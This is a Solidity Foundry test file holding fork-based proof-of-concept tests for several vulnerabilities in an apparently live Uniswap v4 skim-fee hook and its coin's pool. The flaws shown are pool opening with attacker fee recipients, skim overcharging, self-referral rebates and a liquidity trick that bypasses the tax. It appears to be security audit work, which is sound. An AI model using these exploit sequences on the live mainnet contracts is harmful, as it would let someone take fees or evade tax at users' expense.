// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

// fork proofs against the LIVE skim hook 0x636c.. and coin 111's canonical
// pool. read only (no broadcast). skips when no rpc is reachable.

import {Test} from "forge-std/Test.sol";

import {HMBudgetRouter} from "./TaxBudget.t.sol";
import {IArtCoinsHookSkimFee, PCAttribution, PCSwapData} from
    "../../../../src/hooks/interfaces/IArtCoinsHookSkimFee.sol";
import {IArtCoinsFeeEscrow} from "../../../../src/interfaces/IArtCoinsFeeEscrow.sol";
import {IArtCoinsHook} from "../../../../src/interfaces/IArtCoinsHook.sol";
import {ArtCoinsHookSkimFee} from "../../../../src/hooks/ArtCoinsHookSkimFee.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {StateLibrary} from "@uniswap/v4-core/src/libraries/StateLibrary.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {PoolModifyLiquidityTest} from "@uniswap/v4-core/src/test/PoolModifyLiquidityTest.sol";
import {PoolSwapTest} from "@uniswap/v4-core/src/test/PoolSwapTest.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {PoolId, PoolIdLibrary} from "@uniswap/v4-core/src/types/PoolId.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {LiquidityAmounts} from "@uniswap/v4-periphery/src/libraries/LiquidityAmounts.sol";

interface IEscrowView {
    function feesToClaim(address, address) external view returns (uint256);
}

interface IRefPayoutBal {
    function credited(address) external view returns (uint256);
}

contract LiveStackTest is Test {
    using PoolIdLibrary for PoolKey;
    using StateLibrary for IPoolManager;

    IPoolManager constant PM = IPoolManager(0x000000000004444c5dc75cB358380D2e3dE08A90);
    address constant HOOK = 0x636c050296B5Cc528D8785169Bf8923716FCa9cc;
    address constant COIN = 0x61C9d89fe1212F6b55fF888816A151463287B8ae;
    address constant ESCROW = 0x7559689765aE86cBB38e68CD1294830CccB125F2;

    bool internal live;
    PoolKey internal canon;
    PoolSwapTest internal swapRouter;
    PoolModifyLiquidityTest internal liqRouter;
    address internal protocolR;
    address internal referralPayout;

    function setUp() public {
        string memory url = vm.envOr("MAINNET_RPC_URL", string("https://mainnet.gateway.tenderly.co"));
        try vm.createSelectFork(url) {
            live = true;
        } catch {
            return;
        }
        canon = PoolKey({
            currency0: Currency.wrap(address(0)),
            currency1: Currency.wrap(COIN),
            fee: 0x800000,
            tickSpacing: 200,
            hooks: IHooks(HOOK)
        });
        (,,,,, protocolR, referralPayout,) = IArtCoinsHookSkimFee(HOOK).skimConfig(canon.toId());
        swapRouter = new PoolSwapTest(PM);
        liqRouter = new PoolModifyLiquidityTest(PM);
        vm.deal(address(this), 1_000 ether);
    }

    receive() external payable {}

    modifier onlyLive() {
        if (!live) return;
        _;
    }

    function _swap(PoolKey memory k, bool z, int256 amt, uint160 limit, bytes memory hd, uint256 v)
        internal
    {
        if (limit == 0) limit = z ? TickMath.MIN_SQRT_PRICE + 1 : TickMath.MAX_SQRT_PRICE - 1;
        swapRouter.swap{value: v}(
            k,
            IPoolManager.SwapParams({zeroForOne: z, amountSpecified: amt, sqrtPriceLimitX96: limit}),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
            hd
        );
    }

    function test_live_canonicalPoolKeyMatches() public onlyLive {
        assertEq(PoolId.unwrap(canon.toId()), 0xf860d8f4896aed6cc1c68d234ba728680902f0ae43a459fbee6f6baa8036f795);
        assertTrue(ArtCoinsHookSkimFee(payable(HOOK)).locker(canon.toId()) != address(0));
    }

    /// H11 live: open pool for coin 111 on the live shared hook, attacker
    /// recipients, 90% skim, 10% lp fee. succeeds.
    function test_bug_H11_live_openPoolForCoin111() public onlyLive {
        address attacker = address(0xA77AC);
        bytes memory fd = abi.encode(
            IArtCoinsHookSkimFee.SkimHookFeeData({
                baselineSkimBps: 90_000,
                bountyBps: 9999,
                maxReferralBpsOfVolume: 0,
                lpFee: 100_000,
                bountyRecipient: payable(attacker),
                protocolRecipient: payable(attacker),
                referralPayout: payable(attacker),
                quoteToken: address(0)
            })
        );
        bytes memory pd = abi.encode(
            IArtCoinsHook.PoolInitializationData({extension: address(0), extensionData: "", feeData: fd})
        );
        vm.prank(attacker);
        PoolKey memory fake = IArtCoinsHook(HOOK).initializePoolOpen(COIN, address(0), -167_800, 10, pd);
        assertEq(address(fake.hooks), HOOK);
        assertEq(Currency.unwrap(fake.currency1), COIN);
        assertTrue(IArtCoinsHookSkimFee(HOOK).poolTaxEnabled(fake.toId()), "even flagged tax-enabled");
        assertEq(ArtCoinsHookSkimFee(payable(HOOK)).locker(fake.toId()), address(0));
    }

    /// H4 live: price limited exact-in buy on the canonical pool. skim is 6%
    /// of the 50 eth specified (3 eth) whatever fills.
    function test_bug_H4_live_priceLimitedBuyOvercharges() public onlyLive {
        (uint160 sqrtP,,,) = PM.getSlot0(canon.toId());
        uint160 limit = sqrtP - sqrtP / 4000; // ~0.05% price move
        uint256 p0 = IEscrowView(ESCROW).feesToClaim(protocolR, address(0));
        uint256 e0 = address(this).balance;
        _swap(canon, true, -50 ether, limit, "", 50 ether);
        uint256 spent = e0 - address(this).balance;
        uint256 protoGot = IEscrowView(ESCROW).feesToClaim(protocolR, address(0)) - p0;
        uint256 skim = 50 ether * 6000 / 100_000; // 3 eth
        uint256 bounty = skim * 8333 / 10_000;
        assertEq(protoGot, skim - bounty, "protocol leg sized on 50 eth");
        assertGt(spent, skim);
        emit log_named_uint("eth spent", spent);
        emit log_named_uint("eth actually swapped", spent - skim);
        emit log_named_uint("effective skim (1e5)", skim * 100_000 / spent);
        assertGt(skim * 100_000 / spent, 12_000, "effective skim at least double the nominal 6%");
    }

    /// H13 live: self-referral at the live cap (250 = 0.25% of volume).
    function test_bug_H13_live_selfReferralRebate() public onlyLive {
        PCSwapData memory inner = PCSwapData({
            attribution: PCAttribution({
                sourceId: bytes32(0), referrer: address(this), campaignId: bytes16(0), referralBps: 250
            }),
            extensionPayload: ""
        });
        bytes memory hd = abi.encode(
            IArtCoinsHook.PoolSwapData({mevModuleSwapData: "", poolExtensionSwapData: abi.encode(inner)})
        );
        uint256 b0 = referralPayout.balance;
        _swap(canon, true, -1 ether, 0, hd, 1 ether);
        assertEq(referralPayout.balance - b0, 0.0025 ether, "0.25% of volume rebated to the swapper's own referral slot");
    }

    /// H14 live: same-unlock add+remove on coin 111's canonical pool mints a
    /// tax exemption budget that a side v4 pool buy consumes.
    function test_bug_H14_live_addRemoveBudgetBypassesTax() public onlyLive {
        // seed: buy PCT on canonical (exempt), build a hookless side pool at the same price
        _swap(canon, true, -3 ether, 0, "", 3 ether);
        uint256 pct = IERC20(COIN).balanceOf(address(this));
        (uint160 sqrtP, int24 tick,,) = PM.getSlot0(canon.toId());
        PoolKey memory side = PoolKey({
            currency0: Currency.wrap(address(0)),
            currency1: Currency.wrap(COIN),
            fee: 3000,
            tickSpacing: 60,
            hooks: IHooks(address(0))
        });
        PM.initialize(side, sqrtP);
        int24 t60 = (tick / 60) * 60;
        {
            uint160 sa = TickMath.getSqrtPriceAtTick(t60 - 6000);
            uint160 sb = TickMath.getSqrtPriceAtTick(t60 + 6000);
            uint128 L = LiquidityAmounts.getLiquidityForAmounts(sqrtP, sa, sb, 2 ether, pct * 9 / 10);
            IERC20(COIN).approve(address(liqRouter), type(uint256).max);
            liqRouter.modifyLiquidity{value: 3 ether}(
                side,
                IPoolManager.ModifyLiquidityParams({
                    tickLower: t60 - 6000, tickUpper: t60 + 6000, liquidityDelta: int256(uint256(L)), salt: 0
                }),
                ""
            );
        }
        int24 t200 = (tick / 200) * 200;
        uint128 budgetL = LiquidityAmounts.getLiquidityForAmount1(
            TickMath.getSqrtPriceAtTick(t200 - 2000), TickMath.getSqrtPriceAtTick(t200 - 1000), pct
        );

        HMBudgetRouter router = new HMBudgetRouter(PM);
        address buyer = address(0xB0B);
        HMBudgetRouter.Args memory a = HMBudgetRouter.Args({
            canon: canon,
            side: side,
            liq: budgetL,
            lower: t200 - 2000,
            upper: t200 - 1000,
            ethIn: 0.1 ether,
            to: buyer,
            doBudget: false
        });
        uint256 snap = vm.snapshotState();
        router.run{value: 0.1 ether}(a);
        uint256 taxed = IERC20(COIN).balanceOf(buyer);
        vm.revertToState(snap);
        a.doBudget = true;
        router.run{value: 0.1 ether}(a);
        uint256 free = IERC20(COIN).balanceOf(buyer);
        emit log_named_uint("side buy, taxed   ", taxed);
        emit log_named_uint("side buy, budget  ", free);
        assertGt(free, taxed * 115 / 100, "15% tax avoided");
        assertEq(IERC20(COIN).balanceOf(address(router)), 0);
    }
}
